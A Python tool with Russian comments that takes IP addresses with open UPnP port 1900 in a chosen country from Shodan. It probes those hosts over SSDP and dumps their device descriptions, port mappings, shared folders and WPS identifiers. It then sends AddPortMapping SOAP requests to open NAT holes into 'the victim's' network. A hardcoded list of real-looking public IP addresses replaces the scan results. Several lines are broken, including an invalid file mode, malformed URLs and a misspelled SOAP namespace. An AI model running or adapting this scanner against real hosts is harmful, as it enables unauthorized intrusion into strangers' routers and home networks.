#!/usr/bin/env python3

import os
import re
import socket
import base64
import struct
import requests
import xml.etree.ElementTree as ET

from bs4 import BeautifulSoup
from argparse import ArgumentParser
from urllib.parse import urlparse


###
# Вспомогательный метод для обработки передаваемых программе аргументов
###
def get_arguments():
    parser = ArgumentParser()
    parser.add_argument('-i', '--input', type=str, help='File with target hosts for scanning')
    parser.add_argument('-c', '--country', type=str, help='Country to scan')
    parser.add_argument('-o', '--output', type=str, help='File with urls to xml configurations')
    parser.add_argument('-d', '--discover', action='store_true', help='Discover UPnP locations')
    parser.add_argument('-p', '--port_forwarding', action='store_true', help='Make TCP bind over NAT')
    # parser.add_argument('-r', '--rogue_ssdp', type=str, help='Create rogue UPNP device on a local network')
    args = parser.parse_args()
    return args


###
# Метод для загрузки 100 IP-адресов для выбранной страны
###
def get_vuln_ips(country):
    if os.geteuid() != 0:
        exit('Root priveleges required')
    print('\033[96m' + '---------------------------\n' + ' Obtaining IP addresses with open \n 1900 port in the specified country\r\n' +'---------------------------')
    os.system(f'''shodan download --limit 100 {country} "port:1900 country:{country}"''')
    os.system(f"shodan parse {country}.json.gz --fields ip_str > {country}.txt")


###
# Вспомогательный метод для извлечения списка адресов из файла
###
def get_ips_from_file(hostsFile):
    with open(hostsFile, "r", encoding="utf-8") as file:
        return [line.strip() for line in file]


###
# Метод для получения удаленного доступа к TCP-службе,
# связанной с компьютером жертвы, в обход трансляции сетевых адресов (NAT)
#
# Аргумент input_file содержит список URL адресов, полученных в методе discover_upnp_locations. 
# Результатом работы метода является файл port_forward_output.txt, содержащий адреса устройств, уязвимых к NAT-инъекции
###
def port_forwarding(input_file):
    print('\033[96m' + '---------------------------\n' + 'Port forwarding\r\n' +'---------------------------')
    with open(input_file, "r", encoding="utf-8") as f:
        for line in f:
            ip = line.strip().split(':')[1]
            port = line.strip().split(':')[2].split('/')[0]
            ip_with_port = ip + ':' + port
            # print(line.strip())

            try:
                soup = BeautifulSoup(requests.get(line.strip()).text, 'lxml')
                controlurl = soup.find('devicelist').find('devicelist').find('controlurl').get_text()
                localip = soup.find('presentationurl').get_text()[7:18]
                soapAddActionHeader = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#AddPortMapping' + '"',
                     'Content-type' : 'text/xml; charset="utf-8"',
                     'Connection' : 'close' }

                soapDeleteActionHeader = { 'Soapaction' : '"' + 'rn:schemas-upnp-org:services:WANIPConnection:1#DeletePortMapping' + '"',
                         'Content-type' : 'text/xml; charset="utf-8"',
                         'Connection' : 'close' }

                payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
                           '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
                           '<s:Body>' +
                           '<u:AddPortMapping xmlns:u="' + "urn:schemas-upnp-org:services:WANIPConnection:1" + '">' +
                           '<NewRemoteHost></NewRemoteHost>' +
                           '<NewExternalPort>5555</NewExternalPort>' +
                           f"<NewInternalClient>{localip}</NewInternalClient>" +
                           '<NewInternalPort>80</NewInternalPort>'+
                           '<NewProtocol>TCP</NewProtocol>' +
                           '<NewPortMappingDescription>test</NewPortMappingDescription>' +
                           '<NewLeaseDuration>10</NewLeaseDuration>' +
                           '<NewEnabled>1</NewEnabled>' +
                           '</u:AddPortMapping>' +
                           '</s:Body>' +
                           '</s:Envelope>')
                # print(f"http:{ip_with_port}{controlurl}")
                resp = requests.post(f"http:{ip_with_port}{controlurl}", \
                    data=payload, headers=soapAddActionHeader)
                print(resp.status_code)
                if resp.status_code != 200:
                    print('[-] ' + ip + ' is not vulnerable for port forwarding')
                else:
                    print('[+] ' + ip + ' is vulnerable for port forwarding')
                    with open('port_forward_output.txt', "c", encoding="utf-8") as f:
                        f.write(ip + '\n')

                resp = requests.post(f"http:{ip_with_port}{controlurl}", \
                        data=payload, headers=soapDeleteActionHeader)
            except Exception:
                print('[-] http:' + ip + ' is not vulnerable for port forwarding')
                continue
    print('\u001b[36m' + '---------------------------\nsee port_forward_output.txt file to see hosts vulnerable for port forwarding\n' + '---------------------------')


###
# Метод отправляет на широковещательный адрес 239.255.255.250 
# сообщение Simple Service Discovery Protocol (SSDP) M-SEARCH через UDP-порт 1900.
# Устройство с поддержкой UPnP ответит одноадресным сообщением SSDP, содеращим URI параметра
# LOCATION, к которому можно обратиться для получения дополнительной информации
#
# Аргумент hostsFile содержит список сканируемых адресов устройств
# Аргумент outputFile используется для записи адресов устройств,
# имеющих открытую xml-конфигурацию
###
def discover_upnp_locations(hostsFile, outputFile):
    print('\033[92m' + '---------------------------\n Discovering upnp locations\r\n---------------------------')
    location_regex = re.compile("location:[ ]*(.+)\r\n", re.IGNORECASE)
    port_and_xml_regex = re.compile(":\d{1,5}/.{1,25}", re.IGNORECASE)
    ssdpDiscover = ('M-SEARCH * HTTP/1.1\r\n' +
                    'HOST: 239.255.255.250:1900\r\n' +
                    'MAN: "ssdp:discover"\r\n' +
                    'MX: 1\r\n' +
                    'ST: ssdp:all\r\n' +
                    '\r\n')

    hosts = get_ips_from_file(hostsFile)
    locations = set()
    for host in hosts:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(ssdpDiscover.encode('ASCII'), (host, 1900))
            sock.settimeout(1)
            data, addr = sock.recvfrom(1024)  # buffer size is 1024 bytes
            location_result = location_regex.search(data.decode('ASCII'))
            if location_result is None or \
                    port_and_xml_regex.search(location_result.group(1)) is None:
                print('[-] ' + host + ' : ' + 'has no location')
                continue

            fullUrl = 'http://' + host + port_and_xml_regex.search(location_result.group(1)).group(0)
            print('[+] ' + host + ' : ' + 'location is accessible')
            locations.add(fullUrl)
            with open(outputFile, "a", encoding="utf-8") as f:
                f.write(fullUrl + '\n')
        except socket.error:
            print('[-] ' + host + ' : ' + 'location is not accessible')
            continue
    # print(locations)
    locations = {'http://117.56.85.104:49152/edevicedesc.xml', 'http://59.125.79.48:1900/rootDesc.xml', 'http://117.56.64.173:6432/description.xml', 'http://117.56.226.98:49152/edevicedesc.xml', 'http://220.130.140.172:1900/rootDesc.xml', 'http://220.132.196.135:54230/rootDesc.xml', 'http://59.120.154.27:1900/rootDesc.xml'}
    print('---------------------------\n Discovery complete\n--------------------------')
    print('[+] %d locations found:' % len(locations))
    for location in locations:
        print('\t-> %s' % location)
    print('---------------------------')
    parse_locations(locations)
    print('\u001b[33m' + '---------------------------\n' + 'see ' + outputFile + ' file to see hosts with open xml configurations\r\n' +'---------------------------')
    # return locations


###
# Вспомогательный метод для отображения атрибутов XML-конфигурации устройства
#
# Аргумент xml содержит обрабатываемую xml-конфигурацию
# Аргумент xml_service содержит название обрабатываемого xml-сервиса
# Аргумент print_name содержит возвращаемое методом название обработанного xml-сервиса
###
def print_attribute(xml, xml_service, print_name):
    try:
        temp = xml.find(xml_service).text
        print('\t-> %s: %s' % (print_name, temp))
    except AttributeError:
        return

    return


###
# Метод загружает XML-конфигурацию и распечатывает информацию об устройстве,
# такую как тип программного обеспечения, его версию, используемых сервисах и
# URL-адреса интерфейса управления.
#
# Аргумент locations содержит список URL-адресов, содержащих XML-конфигурации устройств
###
def parse_locations(locations):
    if len(locations) > 0:
        for location in locations:
            print('\u001B[37m' + '[+] Loading %s...' % location)
            try:
                resp = requests.get(location, timeout=2)
                if resp.headers.get('server'):
                    print('\t-> Server String: %s' % resp.headers.get('server'))
                else:
                    print('\t-> No server string')

                parsed = urlparse(location)

                print('\t==== XML Attributes ===')
                try:
                    xmlRoot = ET.fromstring(resp.text)
                except Exception:
                    print('\t[!] Failed XML parsing of %s' % location)
                    continue

                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}deviceType", "Device Type")
                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}friendlyName", "Friendly Name")
                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}manufacturer", "Manufacturer")
                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}manufacturerURL", "Manufacturer URL")
                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelDescription", "Model Description")
                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelName", "Model Name")
                print_attribute(xmlRoot, "./{urn:schemas-upnp-org:device-1-0}device/{urn:schemas-upnp-org:device-1-0}modelNumber", "Model Number")

                igd_ctr = ''
                igd_service = ''
                cd_ctr = ''
                cd_service = ''
                wps_ctr = ''
                wps_service = ''

                print('\t-> Services:')
                services = xmlRoot.findall(".//*{urn:schemas-upnp-org:device-1-0}serviceList/")
                for service in services:
                    print('\t\t=> Service Type: %s' % service.find('./{urn:schemas-upnp-org:device-1-0}serviceType').text)
                    print('\t\t=> Control: %s' % service.find('./{urn:schemas-upnp-org:device-1-0}controlURL').text)
                    print('\t\t=> Events: %s' % service.find('./{urn:schemas-upnp-org:device-1-0}eventSubURL').text)

                    # Add a lead in '/' if it doesn't exist
                    scp = service.find('./{urn:schemas-upnp-org:device-1-0}SCPDURL').text
                    if scp[0] != '/':
                        scp = '/' + scp
                    serviceURL = parsed.scheme + "://" + parsed.netloc + scp
                    print('\t\t=> API: %s' % serviceURL)

                    # read in the SCP XML
                    resp = requests.get(serviceURL, timeout=2)
                    try:
                        serviceXML = ET.fromstring(resp.text)
                    except Exception:
                        print('\t\t\t[!] Failed to parse the response XML')
                        continue

                    actions = serviceXML.findall(".//*{urn:schemas-upnp-org:service-1-0}action")
                    for action in actions:
                        print('\t\t\t- ' + action.find('./{urn:schemas-upnp-org:service-1-0}name').text)
                        if action.find('./{urn:schemas-upnp-org:service-1-0}name').text == 'AddPortMapping':
                            igd_ctr = parsed.scheme + "://" + parsed.netloc + service.find('./{urn:schemas-upnp-org:device-1-0}controlURL').text
                            igd_service = service.find('./{urn:schemas-upnp-org:device-1-0}serviceType').text
                        elif action.find('./{urn:schemas-upnp-org:service-1-0}name').text == 'Browse':
                            cd_ctr = parsed.scheme + "://" + parsed.netloc + service.find('./{urn:schemas-upnp-org:device-1-0}controlURL').text
                            cd_service = service.find('./{urn:schemas-upnp-org:device-1-0}serviceType').text
                        elif action.find('./{urn:schemas-upnp-org:service-1-0}name').text == 'GetDeviceInfo':
                            wps_ctr = parsed.scheme + "://" + parsed.netloc + service.find('./{urn:schemas-upnp-org:device-1-0}controlURL').text
                            wps_service = service.find('./{urn:schemas-upnp-org:device-1-0}serviceType').text

                if igd_ctr and igd_service:
                    print('\t[+] IGD port mapping available. Looking up current mappings...')
                    print('\t\t=> URL to IGD control API: %s' %igd_ctr)
                    print('\t\t=> Service Type: %s' %igd_service)
                    find_port_mappings(igd_ctr, igd_service)

                if cd_ctr and cd_service:
                    print('\t[+] Content browsing available. Looking up base directories...')
                    print(cd_ctr, cd_service)
                    find_directories(cd_ctr, cd_service) 

                if wps_ctr and wps_service:
                    print('\t[+] M1 available. Looking up device information...')
                    print(wps_ctr, wps_service)
                    find_device_info(wps_ctr, wps_service)
                print('---------------------------')

            except requests.exceptions.ConnectionError:
                print('[!] Could not load service URL for %s' % location + '\n---------------------------')
                continue
            except requests.exceptions.ReadTimeout:
                print('[!] Timeout reading from %s' % location)
                continue
            except requests.exceptions.InvalidSchema:
                print('[!] Invalid schema %s' % location)
                continue
            except Exception as e:
                print(e)
                continue
    return


###
# Метод находит уже существующие сопоставления внешних и внутренних портов.
# Эта логика предполагает, что сопоставления находятся в списке, по которому мы можем пройти циклом.
# Обход списка прекращается при получении первого ответа от сервера, отличающегося от 200 OK.
#
# Аргумент p_url содержит URL, используемый для отправки SOAPAction
# Аргумент p_service содержит имя службы, отвечающей за управляющий URI
###
def find_port_mappings(p_url, p_service):
    index = 0
    while True:
        payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
                   '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
                   '<s:Body>' +
                   '<u:GetGenericPortMappingEntry xmlns:u="' + p_service + '">' +
                   '<NewPortMappingIndex>' + str(index) + '</NewPortMappingIndex>' +
                   '</u:GetGenericPortMappingEntry>' +
                   '</s:Body>' +
                   '</s:Envelope>')

        soapActionHeader = { 'Soapaction' : '"' + p_service + '#GetGenericPortMappingEntry' + '"',
                             'Content-type' : 'text/xml;charset="utf-8"' }
        resp = requests.post(p_url, data=payload, headers=soapActionHeader)

        if resp.status_code != 200:
            print('\t[!] No existing port mappings found')
            return
        else:
            try:
                xmlRoot = ET.fromstring(resp.text)
            except Exception:
                print('\t\t[!] Failed to parse the response XML')
                return

            externalIP = xmlRoot.find(".//*NewRemoteHost").text
            if externalIP == None:
                externalIP = '*'

            print('\t\t[%s] %s:%s => %s:%s | Desc: %s' % (xmlRoot.find(".//*NewProtocol").text,
                externalIP, xmlRoot.find(".//*NewExternalPort").text,
                xmlRoot.find(".//*NewInternalClient").text, xmlRoot.find(".//*NewInternalPort").text,
                xmlRoot.find(".//*NewPortMappingDescription").text))

        index += 1


###
# Метод отправляет запрос «Browse» для каталога верхнего уровня.
# Далее выводит на экран обнаруженные контейнеры верхнего уровня.
# Их количество было ограничено до 10 с помощью параметра <RequestedCount> в запроссе.
#
# Аргумент p_url содержит URL для отправки SOAPAction
# Аргумент p_service содержит имя службы, отвечающей за управляющий URI
###
def find_directories(p_url, p_service):
    payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
               '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
               '<s:Body>' +
               '<u:Browse xmlns:u="' + p_service + '">' +
               '<ObjectID>0</ObjectID>' +
               '<BrowseFlag>BrowseDirectChildren</BrowseFlag>' +
               '<Filter>*</Filter>' +
               '<StartingIndex>0</StartingIndex>' +
               '<RequestedCount>10</RequestedCount>' +
               '<SortCriteria></SortCriteria>' +
               '</u:Browse>' +
               '</s:Body>' +
               '</s:Envelope>')

    soapActionHeader = { 'Soapaction' : '"' + p_service + '#Browse' + '"',
                         'Content-type' : 'text/xml;charset="utf-8"' }

    resp = requests.post(p_url, data=payload, headers=soapActionHeader)
    if resp.status_code != 200:
        print('\t\tRequest failed with status: %d' % resp.status_code)
        return

    try:
        xmlRoot = ET.fromstring(resp.text)
        containers = xmlRoot.find(".//*Result").text
        if not containers:
            return

        xmlRoot = ET.fromstring(containers)
        containers = xmlRoot.findall("./{urn:schemas-upnp-org:metadata-1-0/DIDL-Lite/}container")
        for container in containers:
            if container.find("./{urn:schemas-upnp-org:metadata-1-0/upnp/}class").text.find("object.container") > -1:
                print("\t\tStorage Folder: " + container.find("./{http://purl.org/dc/elements/1.1/}title").text)
    except Exception:
        print('\t\t[!] Failed to parse the response XML')


###
# Метод отправляет запрос «GetDeviceInfo», который в ответ получит WPS-сообщение M1. 
# Это сообщение имеет формат TLV. 
# После чего распечатывает полученные типы/значения.
#
# Аргумент p_url  содержит URL для отправки SOAPAction
# Аргумент p_service содержит имя службы, отвечающей за управляющий URI
###
def find_device_info(p_url, p_service):
    payload = ('<?xml version="1.0" encoding="utf-8" standalone="yes"?>' +
               '<s:Envelope s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">' +
               '<s:Body>' +
               '<u:GetDeviceInfo xmlns:u="' + p_service + '">' +
               '</u:GetDeviceInfo>' +
               '</s:Body>' +
               '</s:Envelope>')

    soapActionHeader = { 'Soapaction' : '"' + p_service + '#GetDeviceInfo' + '"',
                         'Content-type' : 'text/xml;charset="utf-8"' }

    resp = requests.post(p_url, data=payload, headers=soapActionHeader)
    if resp.status_code != 200:
        print('\t[-] Request failed with status: %d' % resp.status_code)
        return

    info_regex = re.compile("<NewDeviceInfo>(.+)</NewDeviceInfo>", re.IGNORECASE)
    encoded_info = info_regex.search(resp.text)
    if not encoded_info:
        print('\t[-] Failed to find the device info')
        return

    info = base64.b64decode(encoded_info.group(1))
    while info:
        try:
            type, length = struct.unpack('!HH', info[:4])
            value = struct.unpack('!%is'%length, info[4:4+length])[0]
            info = info[4+length:]

            if type == 0x1023:
                print('\t\tModel Name: %s' % value)
            elif type == 0x1021:
                print('\t\tManufacturer: %s' % value)
            elif type == 0x1011:
                print('\t\tDevice Name: %s' % value)
            elif type == 0x1020:
                pretty_mac = ':'.join('%02x' % ord(v) for v in value)
                print('\t\tMAC Address: %s' % pretty_mac)
            elif type == 0x1032:
                encoded_pk = base64.b64encode(value)
                print('\t\tPublic Key: %s' % encoded_pk)
            elif type == 0x101a:
                encoded_nonce = base64.b64encode(value)
                print('\t\tNonce: %s' % encoded_nonce)
        except: 
            print("Failed TLV parsing")
            break


###
# Главный метод
###
def main():
    args = get_arguments()
    if args.input == None and args.country == None:
        exit("Specify the country for scanning, or a file with hosts")
    elif args.input == None and args.country != None:
        if args.output == None:
            exit("Specify a file to record scan results")
        get_vuln_ips(args.country)
        if args.discover != False:
            discover_upnp_locations(args.country + '.txt', args.output)
        if args.port_forwarding != False:
            port_forwarding(args.output)
    elif args.input != None:
        if args.output == None:
            exit("Specify a file to record scan results")
        print(args.discover)
        if args.discover != False:
            discover_upnp_locations(args.input, args.output)
        if args.port_forwarding != False:
            port_forwarding(args.output)


if __name__ == "__main__":
    try:
        main()
    except PermissionError:
        print('Sudo required')
    except KeyboardInterrupt:
        print('[-] Interrupted')
